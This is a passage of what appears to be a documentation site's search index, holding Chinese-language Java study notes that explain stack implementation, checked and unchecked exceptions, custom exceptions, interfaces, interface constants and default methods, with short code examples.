}\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#stringstack","title":"<code>StringStack()</code>","text":"<pre><code>public StringStack(int capacity) {\n    data = new String[capacity];\n    top = 0;\n}\n</code></pre> <p>\u6784\u9020\u51fd\u6570\u7528\u5b57\u7b26\u4e32\u7ec4\u586b\u5145\u4e00\u5b9a\u5bb9\u91cf\uff0c<code>top</code> \u4ee3\u8868 stack \u9876\u90e8\u7d22\u5f15\uff0c\u968f\u7740 push \u6216 pop \u4f1a\u53d8\u52a8</p>"},{"location":"cs/java/basics/w8/#push","title":"<code>push()</code>","text":"<pre><code>public void push(String s) {\n    if (top == data.length) {\n        throw new RuntimeException(\"Stack is full\");\n    }\n    data[top++] = s;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7b2c\u4e09\u884c <code>throw</code> \u5199\u6cd5\u9632\u6b62\u5806\u6808\u7a7a\u95f4\u5df2\u6ee1\uff0c\u751f\u6210\u65b0\u7684 <code>RuntimeException</code> \u903b\u8f91\u9519\u8bef\u5bf9\u8c61\uff0c\u7b2c\u4e94\u884c stack \u9876\u66f4\u65b0</p>"},{"location":"cs/java/basics/w8/#pop","title":"<code>pop()</code>","text":"<pre><code>public String pop() {\n    if (top == 0) {\n        throw new RuntimeException(\"Stack is empty\");\n    }\n    return data[--top];\n}\n</code></pre> <p>\u7b2c\u4e94\u884c stack \u9876\u66f4\u65b0</p>"},{"location":"cs/java/basics/w8/#runtimeexception","title":"RuntimeException","text":"<ul> <li>\u6709\u4e24\u79cd\u5f02\u5e38\uff1a\u8fd0\u884c\u65f6\u5f02\u5e38\u548c\u5176\u4ed6\u6240\u6709\u5f02\u5e38\u3002</li> <li>\u8fd0\u884c\u65f6\u5f02\u5e38\u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83\uff0c\u5b83\u4ee3\u8868\u4e86\u7a0b\u5e8f\u4e2d\u7684\u903b\u8f91\u9519\u8bef\u3002</li> <li>\u5b83\u4eec\u88ab\u79f0\u4e3a\u201c\u672a\u68c0\u67e5\u5f02\u5e38\u201d\uff0c\u56e0\u4e3a\u4f60\u4e0d\u5fc5\u68c0\u67e5\u5b83\u4eec\u3002</li> <li>\u5176\u4ed6\u5f02\u5e38\u53eb\u4f5c \u201c\u5df2\u68c0\u67e5\u5f02\u5e38\u201d\uff0c\u4f60\u5fc5\u987b\u7528 <code>try-catch</code> \u6765\u68c0\u67e5\u5b83\u4eec\u3002</li> </ul>"},{"location":"cs/java/basics/w8/#custom-exception","title":"Custom Exception","text":"<pre><code>public class StackFull extends Exception {\n    public StackFull(String message) {\n        super(message);\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u662f\u4e00\u4e2a\u65b0\u7684\u5f02\u5e38\u7c7b\uff0c\u63cf\u8ff0\u4e86\u6211\u4eec\u7684\u6808\u5df2\u6ee1\u7684\u60c5\u51b5</p> <ul> <li>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6269\u5c55 <code>Throwable</code> \u6216\u5176\u5b50\u7c7b\u6765\u521b\u5efa\u81ea\u5df1\u7684\u5f02\u5e38</li> <li>\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4f60\u5e94\u8be5\u53ea\u6269\u5c55 <code>Exception</code>\u3001<code>RuntimeException</code> \u6216\u5b83\u4eec\u7684\u5b50\u7c7b</li> <li><code>Exception</code> \u901a\u5e38\u7528\u4e8e\u53ef\u6062\u590d\u7684\u9519\u8bef\uff0c\u800c <code>RuntimeException</code> \u7528\u4e8e\u7a0b\u5e8f\u9519\u8bef\uff0c<code>Error</code> \u7528\u4e8e\u7cfb\u7edf\u9519\u8bef</li> <li>\u5bf9\u4e8e\u6211\u4eec\u7684\u6808\u6765\u8bf4\uff0c<code>RuntimeException</code> \u53ef\u80fd\u662f\u4e00\u4e2a\u66f4\u597d\u7684\u9009\u62e9\uff0c\u4f46\u6211\u4eec\u4f7f\u7528 <code>Exception</code> \u6765\u6f14\u793a\u68c0\u67e5\u578b\u5f02\u5e38</li> </ul> <p>\u4ee5\u4e0b\u6587\u4ef6\u4f7f\u7528\uff1a</p> <pre><code>public void push(String s) {\n    if (top == data.length) {\n        throw new StackFull(\"Stack can only hold \" + data.length + \"elements\");\n    }\n    data[top++] = s;\n}\n</code></pre> <p>\u81ea\u5b9a\u4e49\u5b8c\u6bd5\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528\uff0c\u4f46\u662f\u4ee5\u4e0a\u4ee3\u7801\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u9488\u5bf9\u53ef\u80fd\u629b\u51fa\u53d7\u68c0\u5f02\u5e38\u7684\u4ee3\u7801\uff1a</p> <ul> <li>\u6709\u4e9b\u9519\u8bef\u662f\u201c\u9700\u8981\u7279\u522b\u6ce8\u610f\u3001\u5fc5\u987b\u63d0\u524d\u5904\u7406\u6216\u58f0\u660e\u201d\u7684\u98ce\u9669\uff0c\u6bd4\u5982\u6587\u4ef6\u627e\u4e0d\u5230 (<code>IOException</code>)\u3001\u6570\u636e\u5e93\u8fde\u63a5\u4e0d\u4e0a (<code>SQLException</code>)\uff0c\u6216\u8005\u50cf\u6211\u4eec\u8fd9\u91cc\u5b9a\u4e49\u7684\u201c\u6808\u6ee1\u4e86\u201d\uff08<code>StackFull</code>\uff09\u3002\u8fd9\u4e9b\u5c31\u662f\u53d7\u68c0\u5f02\u5e38\u3002</li> </ul> <ul> <li>\u8981\u4e48\u4f7f\u7528 <code>try catch</code> \u5f53\u573a\u6355\u83b7\uff0c\u8981\u4e48\u5728\u65b9\u6cd5\u7b7e\u540d\u4e0a\u7528 <code>throws</code> \u5173\u952e\u5b57\u58f0\u660e\u3002\u8b66\u544a\u8c03\u7528\u8005\u8fd9\u4e2a\u65b9\u6cd5\u6709\u629b\u51fa\u8fd9\u79cd\u5f02\u5e38\u7684\u98ce\u9669</li> <li><code>Unchecked Exception</code>\uff0c\u901a\u5e38\u6307 <code>RuntimeException</code> \u53ca\u5176\u5b50\u7c7b\uff0c\u6bd4\u5982 <code>NullPointerException</code>, <code>ArrayIndexOutOfBoundsException</code>\u3002Java \u4e0d\u5f3a\u5236\u4f60\u5fc5\u987b\u58f0\u660e\u6216\u6355\u83b7\u5b83\u4eec\uff0c\u56e0\u4e3a\u5b83\u4eec\u901a\u5e38\u88ab\u8ba4\u4e3a\u662f\u7f16\u7a0b\u903b\u8f91\u9519\u8bef</li> </ul> <pre><code>public void push(String s) throws StackFull {\n    if (top == data.length) {\n        throw new StackFull(\"Stack can only hold \" + data.length + \"elements\");\n    }\n    data[top++] = s;\n}\n</code></pre> <ul> <li>A comma-separated list can be used to throw multiple exceptions: <code>throws Exception1, Excpetion2</code></li> </ul> <p>\u90a3\u4e48\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u4e00\u65e6\u8c03\u7528\u8be5 <code>Checked Exception</code> \u65b9\u6cd5\uff0cJava \u7684\u89c4\u5219\u662f \u201c\u8981\u4e48\u6355\u83b7\uff0c\u8981\u4e48\u58f0\u660e\u201d\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8c03\u7528\u8005\uff08\u8fd9\u91cc\u662f <code>main</code> \u65b9\u6cd5\uff09\u5fc5\u987b\u4e8c\u9009\u4e00\uff1a</p> <ul> <li>\u6355\u83b7 (Catch): \u4f7f\u7528 <code>try...catch</code> \u5757\u628a\u8c03\u7528\u8bed\u53e5\u5305\u8d77\u6765\uff0c\u5e76\u5728 <code>catch</code> \u90e8\u5206\u5904\u7406\u53ef\u80fd\u53d1\u751f\u7684 <code>StackFull</code> \u5f02\u5e38\u3002</li> <li>\u58f0\u660e (Declare): \u5728 <code>main</code> \u65b9\u6cd5\u81ea\u5df1\u7684\u7b7e\u540d\u4e0a\u4e5f\u52a0\u4e0a <code>throws StackFull</code>\uff0c\u628a\u5904\u7406\u8fd9\u4e2a\u5f02\u5e38\u7684\u8d23\u4efb\u7ee7\u7eed\u5f80\u4e0a\uff08\u6700\u7ec8\u4f1a\u4f20\u7ed9 JVM\uff0c\u5bfc\u81f4\u7a0b\u5e8f\u53ef\u80fd\u56e0\u672a\u6355\u83b7\u5f02\u5e38\u800c\u7ec8\u6b62\uff09\u3002</li> </ul> <pre><code>public static void main(String[] args) {\n    StringStack2 ss = new StringStack2(5);\n    try {\n        ss.push(\"Hello\");\n        ss.push(\"World\");\n        ss.push(\"!\");\n        ss.push(\"Hello\");\n        ss.push(\"World\");\n        ss.push(\"!\");\n    } catch (StackFull e) {\n        System.out.println(e);\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u5c31\u4f1a\u7ee7\u7eed\u6267\u884c\uff0c\u56e0\u4e3a\u53ef\u4ee5\u6293\u4f4f <code>StackFull</code> \u5f02\u5e38</p>"},{"location":"cs/java/basics/w8/#interfaces","title":"Interfaces","text":"<p>Java \u8bed\u8a00\u4e0d\u5141\u8bb8\u7c7b\u7684\u591a\u91cd\u7ee7\u627f\u3002\u5047\u8bbe\u6211\u4eec\u6709\u4e24\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u7c7b\uff0c\u5206\u522b\u53eb\u505a A \u548c B\u3002\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u60f3\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7c7b C\uff0c\u8ba9\u5b83\u540c\u65f6\u7ee7\u627f A \u548c B \u7684\u7279\u6027\u548c\u529f\u80fd\uff0c\u8fd9\u662f\u4e0d\u5141\u8bb8\u7684\u3002\u4f60\u4e0d\u80fd\u5199\u50cf <code>class C extends A, B { ... }</code> \u8fd9\u6837\u7684\u4ee3\u7801\u3002\u5728 Java \u91cc\uff0c\u4e00\u4e2a\u7c7b\u6700\u591a\u53ea\u80fd\u76f4\u63a5\u7ee7\u627f \u4e00\u4e2a \u7236\u7c7b (<code>class C extends A</code> \u662f\u53ef\u4ee5\u7684)\u3002</p> <ul> <li>\u6700\u4e3b\u8981\u7684\u539f\u56e0\u662f\u4e3a\u4e86\u907f\u514d\u4ea7\u751f\u6b67\u4e49\u548c\u6df7\u6dc6\u3002\u5982\u679c\u5141\u8bb8\u4e00\u4e2a\u7c7b\u540c\u65f6\u7ee7\u627f\u4e24\u4e2a\u7236\u7c7b\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u8ba9\u7f16\u8bd1\u5668\u6216\u8fd0\u884c\u65f6\u73af\u5883 \u201c\u4e0d\u77e5\u9053\u8be5\u542c\u8c01\u7684\u201d \u7684\u5c34\u5c2c\u60c5\u51b5\u3002<ul> <li>\u5f53\u4f60\u521b\u5efa\u4e00\u4e2a C \u7684\u5bf9\u8c61 <code>c</code>\uff0c\u7136\u540e\u8c03\u7528 <code>c.doWork()</code> \u65f6\uff0c\u7a0b\u5e8f\u5e94\u8be5\u6267\u884c A \u7248\u672c\u7684 <code>doWork()</code> \u8fd8\u662f B \u7248\u672c\u7684 <code>doWork()</code> \u5462\uff1f\u8fd9\u5c31\u4ea7\u751f\u4e86\u6b67\u4e49\uff0c\u4e0d\u77e5\u9053\u8be5\u9009\u62e9\u54ea\u4e2a\u5b9e\u73b0\u3002\u5982\u679c\u7c7b A \u6709\u4e2a\u53d8\u91cf <code>name</code> (\u7c7b\u578b\u662f String)\uff0c\u7c7b B \u4e5f\u6709\u4e2a\u53d8\u91cf <code>name</code> (\u7c7b\u578b\u53ef\u80fd\u662f int\uff0c\u6216\u8005\u4e5f\u662f String \u4f46\u8bbf\u95ee\u6743\u9650\u4e0d\u540c)\u3002</li> </ul> </li> </ul> <ul> <li>\u4e0e\u5176\u8bbe\u8ba1\u590d\u6742\u7684\u89c4\u5219\u50cf C++ \u6765\u89e3\u51b3\u4e0a\u8ff0\u7684\u6b67\u4e49\u95ee\u9898\uff0cJava \u76f4\u63a5\u7981\u7528\u591a\u91cd\u7ee7\u627f\uff0c\u6539\u7528\u4e86\u63a5\u53e3 Interface \u89e3\u51b3\u8be5\u95ee\u9898</li> </ul> <ul> <li>An interface is like a class that only contains abstract methods</li> </ul> <p>\u63a5\u53e3\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e00\u79cd\u7eaf\u7cb9\u7684\u201c\u5408\u540c\u201d\u6216\u201c\u89c4\u8303\u201d\u3002\u5b83\u4e3b\u8981\u5c31\u662f\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u7684\u65b9\u6cd5\u7b7e\u540d\uff08\u901a\u5e38\u662f\u62bd\u8c61\u7684\uff0c\u6ca1\u6709\u5b9e\u73b0\u4f53\uff09\uff0c\u89c4\u5b9a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u7684\u7c7b\u5fc5\u987b\u63d0\u4f9b\u8fd9\u4e9b\u65b9\u6cd5\u7684\u5177\u4f53\u5b9e\u73b0\u3002\uff08\u6ce8\uff1aJava 8 \u4e4b\u540e\u63a5\u53e3\u53ef\u4ee5\u6709\u9ed8\u8ba4\u5b9e\u73b0\u7b49\uff0c\u4f46\u6838\u5fc3\u6982\u5ff5\u4ecd\u662f\u5b9a\u4e49\u89c4\u8303\uff09\u3002\u56e0\u4e3a\u63a5\u53e3\uff08\u4f20\u7edf\u4e0a\uff09\u53ea\u5305\u542b\u62bd\u8c61\u65b9\u6cd5\uff0c\u6ca1\u6709\u5177\u4f53\u7684\u5b9e\u73b0\u4ee3\u7801\uff0c\u6240\u4ee5\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u591a\u4e2a\u63a5\u53e3\u65f6\uff0c\u5c31\u4e0d\u4f1a\u9047\u5230\u524d\u9762\u8bf4\u7684\u201c\u7ee7\u627f\u54ea\u4e2a\u5b9e\u73b0\u201d\u7684\u6b67\u4e49\u95ee\u9898\u3002</p> <ul> <li> <p><code>implements</code> \u5173\u952e\u5b57\uff1a\u5f53\u4e00\u4e2a\u7c7b\u8981\u9075\u5b88\u67d0\u4e2a\u63a5\u53e3\u7684\u89c4\u8303\u65f6\uff0c\u6211\u4eec\u7528 <code>implements</code> \u5173\u952e\u5b57\uff0c\u800c\u4e0d\u662f <code>extends</code>\u3002</p> <ul> <li>\u4e00\u4e2a\u7c7b\u53ef\u4ee5 <code>implements</code> \u4efb\u610f\u6570\u91cf\u7684\u63a5\u53e3\uff0c\u7528\u9017\u53f7\u9694\u5f00\u3002\u4f8b\u5982 <code>class F implements B, C { ... }</code>\uff0c\u610f\u5473\u7740 F \u7c7b\u627f\u8bfa\u4f1a\u5b9e\u73b0 B \u63a5\u53e3\u548c C \u63a5\u53e3\u8981\u6c42\u7684\u6240\u6709\u65b9\u6cd5\u3002</li> </ul> <ul> <li>\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u6700\u591a\u7ee7\u627f\u4e00\u4e2a\u7236\u7c7b (<code>extends</code>)\uff0c\u540c\u65f6\u5b9e\u73b0\u4efb\u610f\u591a\u4e2a\u63a5\u53e3 (<code>implements</code>)\u3002\u4f8b\u5982 <code>class D extends A implements B { ... }</code>\uff0c\u610f\u5473\u7740 D \u7ee7\u627f\u4e86 A \u7684\u7279\u6027\uff08\u53ef\u80fd\u5305\u62ec\u4e00\u4e9b\u5177\u4f53\u5b9e\u73b0\uff09\uff0c\u5e76\u4e14\u8fd8\u627f\u8bfa\u9075\u5b88 B \u63a5\u53e3\u7684\u89c4\u8303\u3002</li> </ul> </li> </ul> <ul> <li>\u5982\u679c\u63a5\u53e3 B \u548c\u63a5\u53e3 C \u90fd\u8981\u6c42\u4e00\u4e2a <code>doSomething()</code> \u65b9\u6cd5\uff0c\u5b9e\u73b0\u5b83\u4eec\u7684\u7c7b F \u53ea\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a <code>doSomething()</code> \u7684\u5b9e\u73b0\uff0c\u5c31\u80fd\u540c\u65f6\u6ee1\u8db3\u4e24\u4e2a\u63a5\u53e3\u7684\u8981\u6c42\u3002</li> </ul>"},{"location":"cs/java/basics/w8/#concepts","title":"Concepts","text":"<pre><code>public interface Example {\n    void exampleMethod1(int param);\n    double exampleMethod2(String s, int x);\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5b9a\u4e49\u63a5\u53e3\u548c\u5b9a\u4e49\u7c7b\u5f88\u50cf\uff0c\u53ea\u662f\u628a <code>class</code> \u5173\u952e\u5b57\u6362\u6210\u4e86 <code>interface</code>\u3002</p> <ul> <li> <p>\u4e00\u4e2a\u516c\u5f00\u7684\u9876\u7ea7\u63a5\u53e3\u5e94\u8be5\u653e\u5728\u4e0e\u63a5\u53e3\u540c\u540d\u7684 <code>.java</code> \u6587\u4ef6\u91cc\uff0c\u9876\u7ea7\u63a5\u53e3\u6307\u7684\u662f\u76f4\u63a5\u5b9a\u4e49\u5728\u4e00\u4e2a <code>.java</code> \u6e90\u6587\u4ef6\u7684\u6700\u5916\u5c42\u3001\u4e0d\u5d4c\u5957\u5728\u4efb\u4f55\u5176\u4ed6\u7c7b\u6216\u63a5\u53e3\u5185\u90e8\u7684\u63a5\u53e3\u3002\u4e00\u4e2a <code>.java</code> \u6587\u4ef6\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2a\u9876\u7ea7\u7c7b\u578b\uff08\u7c7b\u6216\u63a5\u53e3\uff09\uff0c\u4f46\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u662f <code>public</code> \u7684\uff0c\u5e76\u4e14\u6587\u4ef6\u540d\u5fc5\u987b\u4e0e\u8fd9\u4e2a <code>public</code> \u7684\u9876\u7ea7\u7c7b\u578b\u5339\u914d\u3002</p> <pre><code>// MyInterface.java \u6587\u4ef6\n\npackage com.example;\n\n// \u8fd9\u4e2a MyInterface \u5c31\u662f\u4e00\u4e2a\u9876\u7ea7\u63a5\u53e3\npublic interface MyInterface {\n    void methodA();\n}\n\n// \u8fd9\u4e2a MyHelperClass \u5c31\u662f\u4e00\u4e2a\u9876\u7ea7\u7c7b (\u53ef\u4ee5\u5728\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u4f46\u53ea\u80fd\u6709\u4e00\u4e2a\u662f public)\nclass MyHelperClass {\n    // ...\n}\n</code></pre> </li> </ul> <ul> <li>\u63a5\u53e3\u91cc\u7684\u6210\u5458\u9ed8\u8ba4\u5c31\u662f\u516c\u5f00\u7684\uff0c<code>Java 8</code> \u4e4b\u524d\u9ed8\u8ba4\u62bd\u8c61\uff0c\u5c31\u7b97\u4e0d\u5199\u5173\u952e\u5b57\uff0c\u975e\u516c\u5f00\u6210\u5458\u4e0d\u7b26\u5408\u63a5\u53e3\u7406\u5ff5</li> </ul>"},{"location":"cs/java/basics/w8/#haslegs-example","title":"HasLegs Example","text":"<pre><code>public interface HasLegs {\n    int countLegs();\n}\n</code></pre> <p>\u63a5\u53e3\u5f80\u5f80\u4ee3\u8868\u4e86\u4e00\u79cd\u5951\u7ea6\uff0c\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u4ee3\u7801\u5728\u5b9e\u73b0\u7684\u65f6\u5019\u90fd\u6709\u8fd4\u56de\u684c\u817f\u6570\uff0c\u9075\u5b88\u4e86\u8fd9\u4e00\u51c6\u5219</p> <pre><code>class Chair implements HasLegs {\n    public int countLegs() {\n        return 4;\n    }\n}\n\nclass Person implements HasLegs {\n    public int countLegs() {\n        return 2;\n    }\n}\n\nclass Spider implements HasLegs {\n    public int countLegs() {\n        return 8;\n    }\n}\n</code></pre> <ul> <li>\u8fd9\u4e2a <code>HasLegs</code> \u63a5\u53e3\u4ee3\u8868\u4e86\u201c\u62e5\u6709\u53ef\u4ee5\u88ab\u8ba1\u6570\u7684\u817f\u201d\u8fd9\u6837\u4e00\u79cd\u6982\u5ff5\u6216\u80fd\u529b\u3002</li> </ul> <ul> <li>\u63a5\u53e3\u901a\u5e38\u5c31\u7528\u6765\u5b9a\u4e49\u8fd9\u79cd\u62bd\u8c61\u7684\u6982\u5ff5\u3001\u80fd\u529b\u3001\u7279\u5f81\u6216\u626e\u6f14\u7684\u89d2\u8272\uff08\u6bd4\u5982 Java \u81ea\u5e26\u7684 <code>Runnable</code> \u8868\u793a\u201c\u80fd\u8dd1\u7684\u201d\uff0c<code>Comparable</code> \u8868\u793a\u201c\u80fd\u6bd4\u8f83\u7684\u201d\uff09\u3002</li> </ul> <ul> <li>\u63a5\u53e3 (Interface) \u901a\u5e38\u4ee3\u8868\u4e00\u79cd\u6982\u5ff5\u3001\u7279\u5f81\u3001\u80fd\u529b\u6216\u89c4\u8303 (notion or trait)\u3002</li> </ul> <ul> <li>\u7c7b (Class) \u901a\u5e38\u4ee3\u8868\u4e00\u79cd\u5177\u4f53\u7684\u4e8b\u7269\u6216\u5bf9\u8c61\u7684\u7c7b\u578b (type of thing) \uff08\u6bd4\u5982 <code>Dog</code>, <code>Table</code>, <code>Robot</code>\uff09\u3002</li> </ul> <pre><code>public class CountLegs {\n    public static void main(String[] args) {\n        HasLegs[] things = new HasLegs[3];\n        things[0] = new Chair();\n        things[1] = new Person();\n        things[2] = new Spider();\n        int sum = 0;\n        for (int i = 0; i &lt; things.length; i++) {\n            sum += things[i].countLegs();\n        }\n        System.out.println(\"Total number of legs: \" + sum);\n    }\n}\n</code></pre> <p><code>HasLegs[]</code> \u53ef\u4ee5\u770b\u5230\u63a5\u53e3\u53ef\u4ee5\u88ab\u5f53\u4f5c\u6570\u7ec4\u3001\u53d8\u91cf\u4e00\u6837\u4f7f\u7528\uff0c\u5c31\u50cf Class \u4e00\u6837</p>"},{"location":"cs/java/basics/w8/#makessounds-example","title":"MakesSounds Example","text":"<pre><code>public interface MakesSounds {\n    String sound();\n}\n</code></pre> <pre><code>abstract class Insect implements HasLegs {\n    @Override\n    public int countLegs() {\n        return 6;\n    }\n}\n// \u62bd\u8c61\u7c7b\u5b9e\u73b0\u4e86 HasLegs \u63a5\u53e3\u540e\u8986\u5199\u9ed8\u8ba4\u6606\u866b\u6709\u516d\u6761\u817f\n\nclass Cricket extends Insect implements MakesSounds {\n    @Override\n    public String sound() {\n        return \"Chirp\";\n    }\n}\n// \u83b7\u5f97\u65b9\u6cd5\uff0c\u5b9e\u73b0 sound \u5177\u4f53\u7ec6\u8282\n\nclass SqueakyChair implements HasLegs, MakesSounds {\n    @Override\n    public int countLegs() {\n        return 4;\n    }\n\n    @Override\n    public String sound() {\n        return \"Squeak\";\n    }\n}\n// \u5b9e\u73b0\u591a\u63a5\u53e3\n</code></pre> <pre><code>public class SoundExample {\n    public static void main(String[] args) {\n        MakesSounds[] things = { new Cricket(), new SqueakyChair() };\n        for (MakesSounds thing : things)\n            System.out.println(thing.sound());\n        HasLegs[] legs = { new Cricket(), new SqueakyChair() };\n        for (HasLegs leg : legs)\n            System.out.println(leg.countLegs());\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230  <code>MakeSounds[]</code> \u4ee5\u53ca <code>HasLegs[]</code> \u76f4\u63a5\u628a\u63a5\u53e3\u5206\u522b\u5f53\u6570\u7ec4\u50a8\u5b58\u5176\u5177\u6709\u76f8\u5173\u7279\u6027\u7684\u7c7b\u4f7f\u7528\uff0c\u7136\u540e\u5206\u522b\u6253\u5370\u5176\u529f\u80fd\uff0c\u4f53\u73b0\u4e86\u591a\u6001\u6027\uff0c\u5f53\u7136\u4e3a\u4e86\u7528\u6237\u66f4\u65b9\u4fbf\u5b9e\u73b0\uff0c\u53ef\u4ee5\u5728\u63a5\u53e3\u5c42\u5c31\u76f4\u63a5\u5b9e\u73b0\u63a5\u53e3\u7ee7\u627f\uff1a</p> <pre><code>public interface HasLegsAndMakesSounds extends HasLegs, MakesSounds {\n    // This interface has no methods of its own.\n    // It inherits the methods from its two parent interfaces.\n}\n</code></pre> <ul> <li>\u53ef\u4ee5\u770b\u5230\u63a5\u53e3\u4e5f\u53ef\u4ee5\u7ee7\u627f\u63a5\u53e3\uff0c\u591a\u63a5\u53e3\u76f4\u63a5\u628a\u4e24\u4e2a\u7279\u6027\u63d0\u524d\u7ed3\u5408\uff0c\u8fd9\u6837\u5728\u5b9e\u73b0\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u76f4\u63a5\u5c06\u8fd9\u5feb\u901f\u5b9e\u73b0\u540c\u65f6\u5177\u5907\u8fd9\u4e24\u79cd\u7279\u6027\u7684\u7c7b</li> </ul> <pre><code>abstract class Insect implements HasLegs {\n    @Override\n    public int countLegs() {\n        return 6;\n    }\n}\n\nclass Cricket extends Insect implements HasLegsAndMakesSounds {\n    @Override\n    public String sound() {\n        return \"Chirp\";\n    }\n}\n\nclass SqueakyChair implements HasLegsAndMakesSounds {\n    @Override\n    public int countLegs() {\n        return 4;\n    }\n\n    @Override\n    public String sound() {\n        return \"Squeak\";\n    }\n}\n</code></pre> <pre><code>public class LegsAndSoundsExample {\n    public static void main(String[] args) {\n        HasLegsAndMakesSounds[] things = { new Cricket(), new SqueakyChair() };\n        for (HasLegsAndMakesSounds thing : things) {\n            System.out.println(thing.sound());\n            System.out.println(thing.countLegs());\n        }\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#interface-variables","title":"Interface variables","text":"<ul> <li>\u63a5\u53e3\u53ef\u4ee5\u5b9a\u4e49\u53d8\u91cf\uff08\u5e38\u91cf\uff09\uff1a \u63a5\u53e3\u5185\u90e8\u53ef\u4ee5\u5b9a\u4e49\u53d8\u91cf\u3002\u4f46\u8981\u7279\u522b\u6ce8\u610f\uff0c\u63a5\u53e3\u4e2d\u5b9a\u4e49\u7684\u4efb\u4f55\u53d8\u91cf\u9ed8\u8ba4\u90fd\u662f <code>public static final</code> \u7684\u3002\u4f46\u662f\u5728\u63a5\u53e3\u5904\u5b9a\u4e49\u5e38\u91cf\u662f\u53ca\u5176\u5c11\u89c1\u7684\uff0c\u540c\u540d\u5e38\u91cf\u4f1a\u76f4\u63a5\u5bfc\u81f4\u7f16\u8bd1\u9519\u8bef\uff0c\u63a5\u53e3\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5b9a\u4e49\u884c\u4e3a\u800c\u4e0d\u662f\u50a8\u5b58\u5e38\u91cf</li> </ul> <pre><code>interface A {\n    int x = 1;\n}\n\ninterface B {\n    double x = 2.0;\n}\n\ninterface C extends A, B {\n    // What's the type of C.x?\n}\n\npublic class DuplicateFields {\n    public static void main(String[] args) {\n        System.out.println(C.x);\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#default","title":"<code>default</code>","text":"<p><code>Java 8</code> \u4e4b\u524d\u63a5\u53e3\u4e2d\u53ea\u80fd\u5305\u542b\u62bd\u8c61\u65b9\u6cd5\u6ca1\u6709\u65b9\u6cd5\u4f53\u548c\u5e38\u91cf\u7684\u6982\u5ff5\uff0c\u6240\u6709\u63a5\u53e3\u7684\u7c7b\u5fc5\u987b\u63d0\u4f9b\u63a5\u53e3\u4e2d\u6240\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> <pre><code>interface HasId {\n    default int getId() {\n        return 0;\n    }\n\n    public class Admin implements HasId {\n        // No need to override getId()\n    }\n}\n</code></pre> <p>\u7b2c\u4e8c\u884c\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u65b9\u6cd5</p> <ul> <li>\u53ef\u80fd\u5bfc\u81f4\u591a\u91cd\u7ee7\u627f\u9519\u8bef\uff1a \u5982\u679c\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u4e24\u4e2a\u4e0d\u540c\u7684\u63a5\u53e3\uff0c\u800c\u8fd9\u4e24\u4e2a\u63a5\u53e3\u6070\u597d\u90fd\u63d0\u4f9b\u4e86\u540c\u540d\u540c\u53c2\u6570\u7684\u9ed8\u8ba4\u65b9\u6cd5\uff0c\u90a3\u4e48\u8fd9\u4e2a\u7c7b\u5c31\u5fc5\u987b\u81ea\u5df1\u91cd\u5199\u8fd9\u4e2a\u65b9\u6cd5\u6765\u660e\u786e\u6307\u5b9a\u5230\u5e95\u4f7f\u7528\u54ea\u4e2a\u5b9e\u73b0\u6216\u8005\u63d0\u4f9b\u4e00\u4e2a\u5168\u65b0\u7684\u5b9e\u73b0\uff0c\u5426\u5219\u5c31\u4f1a\u4ea7\u751f\u7f16\u8bd1\u9519\u8bef\u3002\u8fd9\u4f7f\u5f97\u9ed8\u8ba4\u65b9\u6cd5\u867d\u7136\u7075\u6d3b\uff0c\u4f46\u4e5f\u9700\u8981\u8c28\u614e\u4f7f\u7528\uff0c\u901a\u5e38\u7528\u4e8e\u7279\u5b9a\u573a\u666f\uff08\u5982\u5411\u540e\u517c\u5bb9\u5730\u7ed9\u63a5\u53e3\u6dfb\u52a0\u65b0\u529f\u80fd\uff09\u3002</li> </ul> <p>\u8fd9\u4e2a\u8003\u8bd5\u4e0d\u8003</p>"},{"location":"cs/java/basics/w8/#stack-interface","title":"Stack Interface","text":"<p>\u4f7f\u7528\u63a5\u53e3\u5b9e\u73b0\u5806\u6808\u6982\u5ff5</p> <pre><code>public interface StringStack {\n    String pop();\n    void push(String s);\n    boolean isEmpty();\n}\n</code></pre> <pre><code>public class ArrayStringStack implements StringStack {\n    private String[] stack;\n\n    public ArrayStringStack() {\n        stack = new String[0];\n    }\n\n    @Override\n    public String pop() {\n        // removes this.stack[0] and returns it\n    }\n\n    @Override\n    public void push(String s) {\n        // Resizes this.stack with s at position 0\n    }\n\n    @Override\n    public boolean isEmpty() {\n        return stack.length == 0;\n    }\n}\n</code></pre> <p>\u8fd9\u4e00\u6bb5\u4f7f\u7528 Array \u5b9e\u73b0\uff0c\u5f88\u6709\u53ef\u80fd\u660e\u5929\u8981\u8003</p> <pre><code>public interface StringStack {\n    String pop();\n    void push(String s);\n    boolean isEmpty();\n}\n\npublic class ArrayStringStack implements StringStack {\n\n    private String[] stack;\n\n    public 